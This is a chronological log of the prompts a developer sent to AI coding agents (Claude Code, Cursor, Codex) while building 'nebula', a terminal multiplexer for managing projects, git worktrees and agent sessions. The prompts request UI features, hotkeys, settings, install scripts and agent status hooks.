# Nebula Prompts

Every session run to build nebula, oldest first: **442 sessions** holding 782 prompts, Aug 4 → Sep 14, 2026. Each session shows the prompt that opened it; the prompts that followed in the same session are folded underneath. Dates are US Eastern, and profanity has been edited out. Untagged sessions ran in Claude Code (400); the rest are marked `cursor` (34) or `codex` (8).

Sources: Claude Code's prompt history (`~/.claude/history.jsonl`, grouped by its session id, pasted text restored) plus the session transcripts, which also tie a session nebula resumed in a worktree back to the one it came from; Codex's `history.jsonl`; Cursor's agent transcripts. Only sessions run in the nebula checkout or its worktrees count. Left out: argument-less slash commands (`/clear`, `/model`, `/usage`…), stray keystrokes, `!` shell lines, nebula's own worktree-relocation messages, one prompt Claude wrote via `nebula spawn`, a prompt re-submitted within 10 minutes, a session that only repeats the previous session's opener, and a handful of asks about other things (a game, vimrc, disk space).

**Days:** [Aug 4](#tue-aug-4-2026) · [Aug 5](#wed-aug-5-2026) · [Aug 6](#thu-aug-6-2026) · [Aug 9](#sun-aug-9-2026) · [Aug 14](#fri-aug-14-2026) · [Aug 18](#tue-aug-18-2026) · [Aug 19](#wed-aug-19-2026) · [Aug 20](#thu-aug-20-2026) · [Aug 21](#fri-aug-21-2026) · [Aug 22](#sat-aug-22-2026) · [Aug 23](#sun-aug-23-2026) · [Aug 24](#mon-aug-24-2026) · [Aug 25](#tue-aug-25-2026) · [Aug 26](#wed-aug-26-2026) · [Aug 27](#thu-aug-27-2026) · [Aug 28](#fri-aug-28-2026) · [Aug 29](#sat-aug-29-2026) · [Aug 30](#sun-aug-30-2026) · [Aug 31](#mon-aug-31-2026) · [Sep 4](#fri-sep-4-2026) · [Sep 5](#sat-sep-5-2026) · [Sep 6](#sun-sep-6-2026) · [Sep 9](#wed-sep-9-2026) · [Sep 10](#thu-sep-10-2026) · [Sep 12](#sat-sep-12-2026) · [Sep 13](#sun-sep-13-2026) · [Sep 14](#mon-sep-14-2026)


## Tue, Aug 4, 2026

### Session 1

> I want to build out a cli tool which is performant, uses very little memory, but kind of acts like a multi plexer to allow creating new terminal windows (similar to ghostty). the main things I need to include, like the peak user experience I'm going for is.  left side panel for project, then if you click on a project, another panel for all worktrees (all work must be done either on the main directory or worktrees), clicking on a worktree will show a third side panel for all agents, then selecting an agent will show a terminal which by default loads up a claude code session. there must be a way to create a new agent (or a new terminal). I should be able to right click to rename agents or rename terminals. separate terminals from agents (terminals should be a the bottom of the list divided, agents near the top.  I want the ability to archive a finished agent which will put it in an archived state and clear out any existing terminal session that might be running. this entire this must be runnable inside a terminal instance (similar to how herder works). I should be able to right click and remove a project from my list of projects, I should be able to right click and delete a worktree when I'm done with it.  I should be able to also right click and delete an agent when I'm done and just don't want it. all the state should be persisted to disk or sqlite so that I can easily restore my previous session when I'm done. we must show indicators for when agents are fresh (gray), finished (green), running (yellow), asking for feedback (red). we may need to use MCP or SKILLS or hooks into claude code that will notify this nebula when stuff is done. look at ../mission-control for one example of how that is done but you could also checkout herdr. do not steal code from any other open source project, write from scratch, you can only gather "ideas". ask me questions to determine which programming language would be best for doing this type of thing with low memory, fast performance, and a good community of open source tooling to easily create terminals, etc.

<details><summary>6 follow-up prompts</summary>

- find a way to write some type of e2e test which will interact with this tui, try to add a project directory (empty git init basically), create a temp worktree, maybe even multiple work trees, then verify we can easily switch between them, easily toggle between projects (pressing tab should open the projects toggle let a user go up and down to select a project, then enter should select the worktree panel, up and down to switch between them, enter to select, then show the agents part of that work tree, try to make a robust e2e test to verify all this works as expected
- how do I run this locally? is there a $PATH i need to set to easily be able to run the compiled version?
- even after I make changes and make new releases will it pick up on that or do I need to keep re-running something
- so is that command you gave something I could just add to an alias to re-use then?
- when I try to add a project, I don't get any path autocomplete.. it would be nice to add that in so I can easily type ~/ and press tab to either autocomplete what is in the directory, kind of like it works on bash, verify with tests
- this doesn't seem to work still

</details>

### Session 2

> when I have a session selected, I can't seem to unfocus it so I can get back to my other sessions worktree / project selects

<details><summary>1 follow-up prompt</summary>

- option + p is not working inside of claude, nor is cmd + backspace in claude

</details>

### Session 3

> make cmd arrow change focus of the panels, require an enter of the session panel to focus lock into it (cmd + left arrow will still change focus, but now we'd need that control + q if we are focus locked or cmd + left)

<details><summary>3 follow-up prompts</summary>

- > webdevcody:~$ nebula kill-server  
  > Error: daemon speaks protocol v1, this client v2 — run `nebula kill-server` and relaunch  
  > webdevcody:~$

- cmd arrow doesn't seem to change my panel focus
- I'm not even using ghostty

</details>

### Session 4

> when clicking on the session panel, it shows a new session panel, do not do that on click, just focus

### Session 5

> when I do command + left arrow, it is supposed to switch from the session panel to the sessions list panel but it doesn't work still, is there a way to enable that?

<details><summary>9 follow-up prompts</summary>

- I'm not using ghostty though, I'm using terminal, does this project build off of ghostty or something? why do you keep talking about ghostty
- what is a key combo that would work universal do you think?
- ok remove cmd + arrow and switch to control + arrow
- instead of control + q, make it control + esc
- ctrl left just switches my mac workspace, think hard to figure out a good key combo that won't intefer with mac, terminal.app, iterm, or ghostty
- is ctrl the same as control on mac? because when I press control + [ or + ] it still doesn't switch focus
- ok help me figure out a better key because the left and right arrow is great, but I just need a better way to just unfocus the selected session.  control + q isn't great because it's close to commabd + q which is close.  I'd love double esc but I'm not sure if we can listen to esc better claude uses it.
- nvm claude uses double esc to clear the input... help me with what combo I should use I don't want ctrl + ], ctrl + esc don't work in terminal.app option + esc also doesn't work
- forget it, go back to control + q, also shift drag doesn't do anything. fix it

</details>

### Session 6

> I need to make it more apparent I have a project / worktree / session selected, the bold isn't enough, find a better UX to achieve this


## Wed, Aug 5, 2026

### Session 7

> how does the agent update the status dot? what approach?

### Session 8

> when I have a session focused, option + delete doesn't seem to work to backspace by words when I have nebula opened in iterm, fix

### Session 9

> if I wanted to provide one command for anyone to install or update this cli tool, what's the best way? a .sh script in the repo? I don't want to use some third party registery at this point

<details><summary>2 follow-up prompts</summary>

- do the curl approach and put in the readme
- why did you make the readme say webdevcody,,, this is part of the agentsystemlabs org

</details>

### Session 10 · `cursor`

> commit my changes, then push my latest branch changes to remote, and if upstream changes exist, pull them, fix conflict, and push when resolved.

### Session 11

> add a way to put dividers between projects, also a way to hold shift and move projects up and down in regards to their order in the list so that I can group projects together

<details><summary>6 follow-up prompts</summary>

- shift + up arrow doesn't seem to work, I'm using termina.app to run nebula... what is wrong with it?
- ok fine do the shift k and j but you do need to update the hint text at the bottom. also I think there should be a way to select a divider to add a label to it or even delete it
- commit and push
- how would I upgrade nebula on a client? does nebula have a built in command to just install the latest version from github?
- yes add in a nebula upgrade subcommand which will just run that curl install script from github
- continue

</details>

### Session 12 · `cursor`

> commit my changes, then push my latest branch changes to remote, and if upstream changes exist, pull them, fix conflict, and push when resolved.

### Session 13

````text
when I do shift j and k, it doesn't seem to move projects under dividers, it just swaps        
    projects, you must treat a divider as something I can move a project under or above separate   
    if I press shift j or k enough
````

<details><summary>4 follow-up prompts</summary>

- You know, when I put a divider, I should be able to move the dividers around. Right now, they seem like my projects are stuck, and I can't move them into new groups. I should be able to move a project into any divider I want.
- verify we have some type of directory watcher on .worktrees or the github worktrees so that when a new worktree is created from an agent or manually it'll update the worktrees list automatically.  right now i created a worktree and it did not show up in that list until i restarted nebula
- when i create a new worktree, it should automatically select that worktree.  also, when I switch or click on new projects or worktrees, the previously displayed session should no longer show. it's confusing that I clicked on a new project but my old session for the previous project or worktree is still showing.
- in fact, change of plans, we should remember the last agent that was selected for that project so that if i switch between projects it'll automatically just show the last selected worktree & agent, same if I'm on a project and I switch worktrees, it should show the last selected agent (or terminal) of that worktree

</details>

### Session 14 · `cursor`

> commit my changes, then push my latest branch changes to remote, and if upstream changes exist, pull them, fix conflict, and push when resolved.

### Session 15

> in the worktrees list, is the first item always the top level project?

<details><summary>4 follow-up prompts</summary>

- ok so if on the main I checkout a new branch name, does it update it's display name in the worktrees list?
- does the worktree name match the branch or are those custom as well, how do those work?
- ok for now, I want the first entry to reflect the actually top level branch name and somehow put an indicator to mention that it's not a worktree but it's the top level root or whatever you'd call it, what approach might you take to achieve this, just give me a UX suggestion, I don't care about your code implementation. also if I create a new worktree, what branch does it default to? main?
- ok let's do those 3 suggestions for now

</details>

### Session 16 · `cursor`

> commit my changes, then push my latest branch changes to remote, and if upstream changes exist, pull them, fix conflict, and push when resolved.


## Thu, Aug 6, 2026

### Session 17

> when deleting a worktree, do not require a user to type the full worktere name, just do a confirm yes or not for delete


## Sun, Aug 9, 2026

### Session 18

> remove the terminal section from the session list, I decided I don't care about terminals as we can just use claude code to run terminal commands directly

### Session 19 · `cursor`

> commit my changes, then push my latest branch changes to remote, and if upstream changes exist, pull them, fix conflict, and push when resolved.


## Fri, Aug 14, 2026

### Session 20

> add support for codex as well, so when a try to load up a new session using the n hotkey, show a modal that let's me pick codex or claude, make sure the codex setup has the proper hooks or whatever else instlaled like we do in claude so that the status indicators can properly reflect the state of the session.

### Session 21

> I want to add a way to have a modal or another panel show a git diff of the worktree I have selected. when that modal is open I shouldn't be able to interact with the normal terminal panels or anythign else, I just want to be able to see all the changed files and the ability to toggle through those files to view the diffs

### Session 22

> verify that the delete confirmation for deleting agents or worktrees doesn't require typing the worktree name or anything, it should just be a y / n type of confirmation like we do other places in the app already

<details><summary>1 follow-up prompt</summary>

- remove the + new agent... text from the sessions list panel

</details>

### Session 23

> I want to just remove the idea of showing the main branch, when a user creates a new worktree, just automatically

### Session 24

> add the ability for a user to slide the width of the projects, worktrees, and sessions panels to change their width

### Session 25 · `cursor`

> commit my changes, then push my latest branch changes to remote, and if upstream changes exist, pull them, fix conflict, and push when resolved.

### Session 26

> add a way for me to cmd click on links inside the output of the sessions to open them, also the ability to double click text to select it, right now I can only click drag to select text and when I let go the stuff doesn't remain highlighted

### Session 27 · `cursor`

> commit my changes, then push my latest branch changes to remote, and if upstream changes exist, pull them, fix conflict, and push when resolved.

### Session 28

> it seems like new sessions don't use my ~/.zshrc, verify the do on load

### Session 29 · `cursor`

> commit my changes, then push my latest branch changes to remote, and if upstream changes exist, pull them, fix conflict, and push when resolved.

<details><summary>2 follow-up prompts</summary>

- when i try to run nebula after upgrade it says daemon speaks v5 client is v6, but when i run nebula kill-server it says non runnning
- no not on this computer bro, a dif one

</details>

### Session 30

> also add support for cursor cli as a session option

<details><summary>1 follow-up prompt</summary>

- also i tried deleting a worktree that i guess was manually deleted and it says error is not a working tree, add edge cases] handling to that

</details>

### Session 31

> also─i tried deleting a worktree that i guess was manually deleted and it says error is not a  
>   working tree, add edge cases] handling to that

### Session 32 · `cursor`

> commit my changes, then push my latest branch changes to remote, and if upstream changes exist, pull them, fix conflict, and push when resolved.

### Session 33

> scrolling back using codex doesn't work, but claude works fine, debug and fix

### Session 34 · `cursor`

> commit my changes, then push my latest branch changes to remote, and if upstream changes exist, pull them, fix conflict, and push when resolved.

### Session 35

> why doesn't nebula upgrade auto kill the daemon after upgrade?

<details><summary>1 follow-up prompt</summary>

- yes implement

</details>

### Session 36 · `cursor`

> commit my changes, then push my latest branch changes to remote, and if upstream changes exist, pull them, fix conflict, and push when resolved.

### Session 37

> run codex with --yolo mode on codex sessions, same with cursor if it has a type of yolo flag see how we do it on mission-control

### Session 38 · `cursor`

> commit my changes, then push my latest branch changes to remote, and if upstream changes exist, pull them, fix conflict, and push when resolved.


## Tue, Aug 18, 2026

### Session 39

> when I scroll on my mouse wheel know (or track pad), it doesn't seem to scroll back in the terminal session output, it instead just switches my previous entered prompts in the input

### Session 40

> when I have an agent session selected in focus or a worktree selected in focus or a project, if I press backspace (delete), it should prompt to delete that project

### Session 41

> add some type of background task for deleting worktrees, I notice when i try to delete a worktree, it often freezes up for a bit until it finally removes the worktree, I'd like it to do optimistic client updates for when it's deleted and rollback if it fails to add back the item in the list

### Session 42

> I'm trying to delete a worktree and it says "cannot remove a locked working tree, lock reason: claude session menu-enable-level".  when I try to delete a worktree, it should force kill and remove any locked sessions part of that worktree

### Session 43

> sometimes I'll be on the main root worktree and I'll start a session, and inside that session I'll prompt it to do the work inside a worktree, which claude or codex will then create the worktree. if possible, when this happens I want to move the session out of that main worktree root and move it to the cooresponding worktree it's working on.  explore if this is even possible

<details><summary>1 follow-up prompt</summary>

- implement the manual move and cwd capture

</details>

### Session 44

> when I create a new worktree, it should auto focus the sessions panel so that I can easiliy just press n to create a new session for that worktree

### Session 45

> when then new agent panel shows up, do not have it pre-fill with agent-1 or anything, it should be blank so I can type in a new. make it optional so if I do not fill in it'll just use agent-1, etc

### Session 46

> when I try command + p in a claude session, it just pastes the pi character and recommends I run /setup-terminal which I already have, can you figure out if maybe command + p is not properly being sent to the claude session? this is inside a terminal.app I'm running nebula. this works perfectly fine if I'm using ghostty to run nebula

### Session 47 · `cursor`

> commit my changes, then push my latest branch changes to remote, and if upstream changes exist, pull them, fix conflict, and push when resolved.

### Session 48

> when I click n with the sessions list focused it shows the harness selector, but it's not centered in the screen like all the other type of modals, make sure this is center.  then give a list of all modals we have in this app and a true / false if it is centered or not, and a reason why if not

<details><summary>2 follow-up prompts</summary>

- render this in ascii table
- yeah center the keyboard context menu too

</details>

### Session 49

> add a way for someone to launch nebula from the cli into a remote ssh. assume ssh keys already allow access to the remachine.  so something like nebula ssh HOST and when we get into the machine it should install nebula if it doesn't already exist on the machine (remote exec of a script), then it should just launch nebula. verify we at least show the hostname (or ip) in the bottom left status bar of nebula so we know if we are remote or local, different colors for that. ask me questions until you are certain you know what I'm looking to achieve

### Session 50

> when someone opens the git diff panel, they should be able to type to filter down to see the releveant files using a fuzzy search, they should also be able to just go up and down the list of files using the keyboard arrows to view the diffs. ask me questions to verify we are building a good user experience

### Session 51

> a user should be able to press / when any of the projects, worktrees, or sessions panels are in focus and then just start typing characters so they can filter down to a specific project, worktree, or session. while they type show a modal with a result list of the releveant projects, worktrees, and sessions. put the best matching at the top. show an indicator for each type and colors so it's easier to know what we are looking at. add emojis in front of the panel list title so Projects should have a directory emoji in front, worktrees, has a tree, etc. ask questions if you need more information about whwat I'm trying to build

<details><summary>3 follow-up prompts</summary>

- continue
- `Aug 27` ok but the issue with control shift h still has this looping issue, it should STOP when a user is pressing control shift h to navigate left on workspaces header
- `Aug 27` if the bar is toggled away, navigation using h should stop at projects list

</details>

### Session 52

> i noticed I'm unable to click select files on the git diff panel, add that support

### Session 53

> i noticed I'm unable to click select files on the git diff panel, add that support

<details><summary>6 follow-up prompts</summary>

- what is the capital of colorado
- would it make sense from a developer experience perspective to allow a user to have a hiearchy of projects -> component -> features -> sessions and then just have all session default to a worktree off of main? or even allow the user to customize the hiearchy based on their needs, so maybe someone could be working between clients or companies and that could be their top level hieacchy. basically let the user define type of thing and it's dynamic for when they hit the sessions layer to allow them to do work. then for each level of the hieacrchy we write to a .nebula/memories/{project}/{components}, etc. which would track certain key memories at that level, so when I prompt at a lower level it could potentially read up levels to find relevant context?, ask me questions until you are certain we are on the same page
- > 1. user sets up the hiearchy  
  > 2. ignore the worktree thing for now.. just keep it a manual process someone has to do, so it'll be projects -> features -> worktrees -> sessions  
  > 3. a user defines it, when nebula starts give the default project -> worktree -> session setup, but they can configure it by when focused on a layer, they can press L to create a new hiearchy layer and name it, so then next time a user focused on a project which has multiple layers, those will show  
  > 4. for now automatically read current and parent layers, but even allow reading memories of all if more ocntext is needed based on the related features or components we think we'll need  
  > 5. technical decisions, bugs we encountered and fixed a certain way, basically how the system is envolving and gotchyas we should know about so if another dev joins they know what to think about, basically instead of letting knowledge live in the devs heads, it should be in a memory for agents to use.  it should try to use hooks to automatically update releveant memory files at the end of a session using a fast sub agent  
  > 6. augments it
  >
  > my idea is often a software project at a company is broken into separate copmonents, systems, sub teams, etc, and if we had a way to easily visualize that breakdown by giving a user a dynamic approach to define a tree of hiearchy they can then group and scope work into that grouping so that a human can understand the main pieces of the puzzle but an agent can also more easily understand the major things we are modifying and if issues happen in 1 module that results in an outage or problem in another module, we will know in the future and hopefully prevent it from happening, or if certain product decisions were made, we know about those.

- > 1. yes it become perm for that project. each layer could have another arbitrary set of layers.  
  > 2. idk whatever makes most sense to easily allow an agent to go up it's layers for context. it would stop at the first layer though. multiple top level layers shouldn't be sharing memories between them.  
  > 3. when the agent completes work. the conversation, it should use the recent sesssion conversation and try to determine what memory files it should update. ask to commit (can be turned of in settings)  
  > 4 agent should do this work. sure, .  
  > 5. yes, yes  
  > 6. agents

- > 1. yaml with front matter  
  > 2. it should ask  
  > 3. yes  
  > 4. yes each session should be stored with frontmater so we can understand what that session was even about, time it happened, etc

- ask me using askquestion tool

</details>

### Session 54

> a user should be able to pin a session which will cause it to show in a separate category in the sessions list called PINNED and then UNPINNED, remove the word "AGENTS" it doesn't make sense IMO. a user should be able to right click to unpin as well which unpins it. make sure we can also do this using a keyboard shortcut when focused on the session.

### Session 55

> if a user tries to open a project and that project directory doesn't exist, we should just create the directory and do a git init insie that directory

<details><summary>2 follow-up prompts</summary>

- also include this in the settings as an option for running git init or not
- show a confirmation saying "this directory doesn't exist, would you like to create it?"

</details>

### Session 56

> when a user is pressing up and down arrow it should just show that session so a user can read it, but do not focus it until they press enter. make sure it's obvious from a deverlop experience perspective if the session panel is focused or not, I feel like right now the border color isn't enough to know if it's focused

### Session 57

> add a setting which is defaulted to on which will decide if when doing the fuzzy find when they user presses enter it should auto focus the session or not.  I could see some users just wanting to get to the session list and do a quick read through of the session then which they can just press enter, and then I see another use case of I want to get to the session directly. also update the fuzzy search hotkeys to allow for a user to open session or just focus sesssion


## Wed, Aug 19, 2026

### Session 58

> in the git diff modal, allow a user to drag to expand the left terminal showing the file names

### Session 59

> add a recent category which will automatically move sessions into recent if their status recently changed, allow configuring how long they will stay in tthere in settings, give like 5m, 10m, 30m, 1h, 24h if no status change since then, then move it to normally UNPINNED. they should never go above pinned though

### Session 60

> make it so a double click on a session will pin / unpin it

### Session 61 · `cursor`

> what is the hotkey for settings modal

<details><summary>1 follow-up prompt</summary>

- add in a settings menu which will allow users to configure that file and turn settings on and off

</details>

### Session 62

> find a way to have a session precached ready to go so when a user tries to create a new session it feeels instant, keep in mind some users might not have claude installed or codex, sp gracefully handle that

### Session 63

> commit and push

### Session 64

> add the ability in the settings for someone to change the color theme, refactor code to more easily support this request if it's haard to add in

### Session 65

> add the ability to archive via a hotkey like a

### Session 66

> commit n push

### Session 67

> please test out the nebula ssh works by trying to connect to a docker container or something

### Session 68

> make sure all errors in nebula are logged into a .log file somewhere so that I can debug when it crashes.  so far i've seen nebula randomly close out and crash twice now when trying to create a new claude session, but I'm not sure how to debug

### Session 69

> when I click on a session in the session list, do not have it focus the session terminal, a user must click and then press enter or double click the session to actually focus on it

### Session 70

> when someone is focused on the projects list, as they use the up and down arrows we should show the projects worktrees and sessions

<details><summary>1 follow-up prompt</summary>

- when a user presses f show a fuzzy file finder which will filter down all files by name of what the user types, re-use the similar logic for the git diff panel or the fuzzy search panel.

</details>

### Session 71

> add the ability for a user to press a hotkey to show a find in files search, basically it should run grep over the code base and return the top results, when a user presses enter it should show a vim terminal to allow editing that file, that vim terminal must be a modal inside this app. there is a session currently adding a file finder (fuzzy search by file name), so maybe use similar patterns of that or just wait for that to finish before you start yours

### Session 72

> i notice that when I click on a session inside the sessions list panel, it doesn't show the terminal associated with that session.  it should show the session terminal but it should not focus that session terminal until the user presses enter or double clicks

### Session 73 · `cursor`

> explain how this project works from a top level

<details><summary>2 follow-up prompts</summary>

- write to a .md file
- open that file

</details>

### Session 74

> when claude code prints file paths, I want to be able to do a option click or whatever how it works for links to actually open that file directly inside a file viewer (vim) inside nebula.  I think there might be an agent already trying to add that, so look first, then add that in for me the best you can, try to add support for the cursor and codex output as well

### Session 75 · `cursor`

> commit and push

### Session 76

> when I do a file search, when I press enter it doesn't load up the vim editor, update it to do that

<details><summary>1 follow-up prompt</summary>

- note that the grep finders works fine when trying to open fies'

</details>

### Session 77

> add a hotkey for t which shows a full tree browser modal with a view of the file content on the right, ability to filter down based on file name which will filter down the tree and only show the maching hierachies showing your matches

<details><summary>1 follow-up prompt</summary>

- in the file preview, it should be syntax highlighted, also when I select the file, it shouldn't open a new vim modal, the right panel should just focus and let editing with vim

</details>

### Session 78

> for modals requiring user input, add a hotkey to clear it to start fresh

### Session 79

> archive should not require a cofirm modal

### Session 80 · `cursor`

> commit and push


## Thu, Aug 20, 2026

### Session 81

> I want to make it so when I create a new claude session, it should load instant, same with codex and the other, this should be a setting that is turned on by default, but basically always have at least a pool of 1 session already setu

### Session 82

> add the ability to pin and unpin work trees, make it the same user experience as it works with sessions

### Session 83

> cursor doesn't seem to update the status of the wortree or sessions when it is running, debug and fix, verify it has hooks, if not, then setup some type of skill that is injected to cursor as a system prompt or something so that it knows how to phone home to nebula to update the status

<details><summary>1 follow-up prompt</summary>

- add --trust to the cursor spawn args

</details>

### Session 84

> [Image #1] in this scenario, where I have core as the top project and under is a separator, I'm unable to move core down, I should be able to move the label to the top or far bottom if I want

<details><summary>1 follow-up prompt</summary>

- also when a user is focused on a label separator, it shouldn't show the worktrees sessions or terminal, right now it still says main even though we are focused on a separator which is strange, you can still show the panels, but do not show any content, in fact put some type of hint text saying "you're focused on a separator, click on a project to see more info"

</details>

### Session 85

> add a shift + D to delete all worktrees or sessions that I currently have focused, be sure to show a confirmation before deleting those and list out which ones will be deleted so it's obvious the action is going to delete a lot of stuff

### Session 86

> in the git diff viewer, add a way for a user to mark a file as "reviewed" or not.  this should not git add  
>   the file or do any git commands, I simply want a way for a user to mark that a file has been reviewed or  
>   not, think through edge cases after a user commits the changes as the "reviewed" for that worktree probably  
>   needs to be reset

<details><summary>2 follow-up prompts</summary>

- it should put reviewed files to the bottom of the list automatically and just select the next one in the list
- commit and push

</details>

### Session 87

> add a way to create a new terminal already in the pwd of the worktree or root, figure out a good key binding for this as cmd + t will open a new ghostty terminal if I'm using ghostty to run nebula

### Session 88

> at the bottom of the worktree panel, show how many file changes in git so it's obvious to a user this worktree or root has changes

### Session 89

> [Image #1] sometimes nebula will enter this state when I try to start a new claude terminal, it just keeps writing strange tokens and the entire app is broken basically, I can't interact, it just happened in a previous session I tried to open

<details><summary>1 follow-up prompt</summary>

- yes

</details>

### Session 90

> when I archive a session, it seems to focus on the next one in the list but it doesn't show the claude session it was associated with, make sure that WHENEVER the higlighted session changes we should be showing the terminal session.  make sure this is also not a bug when I delete a session and it selects the next one in the list.  same thing work worktrees and projects, similar logic where it should highlight the next one and show the info about it

### Session 91

> commit and push

### Session 92

> add in a "todo" modal which basically allows me to make todo notes specific for projects and worktrees specifically, so pressing a hotkey would just show a modal which allows me to create a list edit delete todo list items. make sure to list out somewhere on the worktree view or sessions list how many todos we have if there are any defined, otherwise we don't need to show 0 todos, make sure this todo list has the crud methods

<details><summary>3 follow-up prompts</summary>

- is this hotkey in the help menu? I don't see it? refactor the help menu as well to be grouped by potential use case instead of just one giant list, you can use 2 columns if necessary
- when I press o I do not see a note modal, do I need to rebuild or something?
- i noticed when I'm focused on a project, I'm unable to add notes to the project, did you also include notes on the project list? the use case is sometimes I have high level tasks or notes I want to attach to a project and then inside of individual work trees there is a different set of notes

</details>

### Session 93

> on the new session menu that shows, for claude and codex, allow a user to press the right arrow to select from a list of models, then right again to selected an effort level.  allow a user to configure the default in settings. make sure the menu is obvious there are more configuration options by having a right arrow icon inside the menu so a user knows they can right arrow to expand. pressing enter should just select whatever they are focused on and use defaults where possible.

### Session 94

> debug why when I run nebula if fails webdevcody:~/Workspace/AgentSystemLabs/nebula$ nebula upgrade  
> zsh: killed     nebula upgrade  
> webdevcody:~/Workspace/AgentSystemLabs/nebula$ nebula  
> zsh: killed     nebula

<details><summary>1 follow-up prompt</summary>

- honestly I'm just trying to rebuild the latest locally and run it

</details>

### Session 95

> nebula fails when I try to run it, give me hte proper commands I should run locally to use the latest built version of nebula

<details><summary>2 follow-up prompts</summary>

- make that into a single script and maybe a makefile if that is the proper way to do these
- rename kill-server to just kill, do that everywhere kill-server is too verbose

</details>

### Session 96 · `codex`

> upgrade

### Session 97

> when a user archives or deletes a session, verify it automatically clears that terminal so save on memory usage and cpu, I think right now we keep a lot claude sessions running so archiving and deleting should def clear that up

### Session 98

> add the ability to collapse the expanded archived sessions.  also the most recently archived should be at the top not the bottom, fix that ordering

### Session 99

> add some type of hook into nebula and ability for claude to automatically rename the session, update the system prompt to use the skill to tell nebula to rename the session after the initial prompt was submitted, we should be able to creat a title between 3-4 words that describe the ask of the prompt. determine if using an mcp or a system prompt or something would make most sense for me and other users using nebula, also keep in mind I want to add this ability for codex and cursor as well

### Session 100

> right now when a user opens a session, it takes some time I think for nebula to connect maybe to the server and actually show the terminal... can we find a way to prefetch these connections so when a user navigates down into a worktree it'll already start binding these terminals instead of doing it lazy

<details><summary>3 follow-up prompts</summary>

- add logic to auto suspend or kill claude sessions that are not in focus. for example if I open a project / worktree, it may prefetch a lot of terminals, these should probably auto expire or close if a user hasn't looked at that worktree in 1 min, allow a user to configure this in settings, 1m, 5m, 15m, 30m, 1h
- I'm concerned now because some claude sessions might have schedules or long running jobs and I don't want them killed.... is the latest change potentially breaking that requirement or do they still run on the nebula server?
- ok for now never reap pinned sessions, also make this entire reap process a setting configurstion to just turn it off.  update the bottom bar right to show total mem usage and total running pid sessions or terminals sessions, etc

</details>

### Session 101

> add some type of metrics modal which will show the overal usage of nebula combined with all the other terminals open, including memory usage for individual and overall.  I want a user to know how much claude or codex and nebula is using in regards to memory on their computer

<details><summary>1 follow-up prompt</summary>

- on the metrics modal allow a user to arrow down and up to select sessions then enter to directly open that session

</details>

### Session 102

> what is my name

### Session 103

> refactor the settings modal to be grouped into separate groups so it's easier to manage, similar to how the hotkey menu works

### Session 104

> commit and push

### Session 105

> /goal continue to improve the design of the app to make it look sleek, take screenshots of the app until it looks good, also try passing screenshots to codex as well for feedback, do this work in a worktree off of main, each step of the way generate a screenshot and put in a directory for me to look at

<details><summary>1 follow-up prompt</summary>

- push this to main

</details>

### Session 106

> when i press right arrow it should stop in the session list and NOT consider that as a user selecting the session

### Session 107

> add the ability to use the nebula cli to add a project, so basically I could cd into a Workspace and run nebula add &lt;dir> or if I'm in the dir nebula add . (would use the parent directory as name)

<details><summary>1 follow-up prompt</summary>

- also support nebula &lt;dir> or nebula . which would automatically just add that project directory into the nebula projects list

</details>

### Session 108

> make it so we always have at least 1 claude session ready inside the selected worktree directory so that when a user tries to creat a new session it load instance (only do this for the default model and effort, if a user tries to launch something outside the default fast loaded, then don't have one ready

### Session 109

> in the git diff modal, when I mark an entry as unreviewed, it navigates me to the first in the list, instead, it should select the next unreviewed item so I can just keep on pressing control + r to unreview a bunch

### Session 110

> install the localhost:8080/skills as a global claude skill for me

<details><summary>1 follow-up prompt</summary>

- sorry just look up ai-knowledge-base inside ../../ai-knowledge-base it has the skills

</details>

### Session 111

> try to create a cool animated ascii animation for a nebula which would display when the app first loads and a use had no projects yet

<details><summary>1 follow-up prompt</summary>

- `Aug 21` did you add this? shift + N didn't seem to show the modal

</details>


## Fri, Aug 21, 2026

### Session 112

> would it be possible to space out the items in the projects worktrees and sessions lists? like to make them feel like larger buttons, also visual hieachy, try to make the project items larger, worktrees a tad smaller, then sessions even smaller than that. also try to make the font size a bit larger for projects, then worktrees, then sessions would be the smallest text

<details><summary>3 follow-up prompts</summary>

- this is good, but remove the space between the items, and also you need to vertically align the text inside the row as right now it's not centered
- great but now you need the session rows to have mo internal padding, right now it seems like they have none, also reduce the height for worktrees a bit
- make sure the inner green left size marker is the full height of the parent, it's not working correctly for worktrees.  also, add more padding top and bottom to sessions and remove the gap between rows

</details>

### Session 113

````text
debug and fix why webdevcody:~/Workspace/AgentSystemLabs/nebula/.claude/worktrees/sleek-design$ make install
cargo build --release
    Finished `release` profile [optimized] target(s) in 0.26s
cp target/release/nebula /Users/webdevcody/.cargo/bin/nebula.new
mv /Users/webdevcody/.cargo/bin/nebula.new /Users/webdevcody/.cargo/bin/nebula
nebula 0.1.0
note: a daemon from the previous version is still running.
      'make kill' restarts onto the new binary (stops ALL sessions).
````

<details><summary>1 follow-up prompt</summary>

- move these changes into main, then make install for me to verify it is setup

</details>

### Session 114 · `cursor`

> list out where we configure the styling padding spacing of the navigation items in the lists?

<details><summary>7 follow-up prompts</summary>

- what is putting gap between rows
- there should be no gap between the rows on session
- also make sure the little left green vertical bar inside these is the full width of the parent, right now it seems smaller for the worktrees rows
- compare the padding difference between worktrees and sessions
- no you made the workree green bar too tall now.... the worktree height was supposed to be step down from the projects, and sessions are a step down from worktrees
- ok but now you added gap back to the worktrees list, I do not want gap between items there
- ok but now you messed up the vertical alignment of the worktree row.. it used to be properly centered now it's aligned to the top

</details>

### Session 115

> commit and push

### Session 116

> when a session is running (when it's yellow status or red), make the text animate with colors with the yellow color or red color. it should be a sweeping animation, also do the same if the worktree is marked as in progress and do same with project navigtation rows text

<details><summary>1 follow-up prompt</summary>

- add a way to disable the animations in settings in case it causes a lot more FPS or cpu usage

</details>

### Session 117

> when a list panel is in focus, render a themed gradient that comes up from the bottom, but very subtle just so a user knows they are focused on that, also do same for the terminal panel

<details><summary>4 follow-up prompts</summary>

- [Image #1] the bottom focus gradient looks bad... let's think of a differnt indicator to do on the focused panel... maybe just make the entire panel a very lightly colored (like 10% opactiy) theme color if that is possible
- make it maybe half opacity, right now it's still to bright and in my face for the bg color
- add padding to the top of the panels above the titles like where it says projects worktrees and sessions, and also left align that text so it lines up with the other stuff in the list
- add this bg on focus as a setting that must be enabled, default it to off

</details>

### Session 118

> add the ability to do a nebula workspace add &lt;name> and then later nebula workspace open &lt;workspace_name>, then all projects will scoped to that workspace.  make sure the / fuzzy find doesn't search over all workspaces. also include a workspace list and workspace delete and workspace rename. inside nebula, add a modal and a hotkey to allow a user to switch between the workspaces they have. display the selected workspace bottom left bar.

<details><summary>5 follow-up prompts</summary>

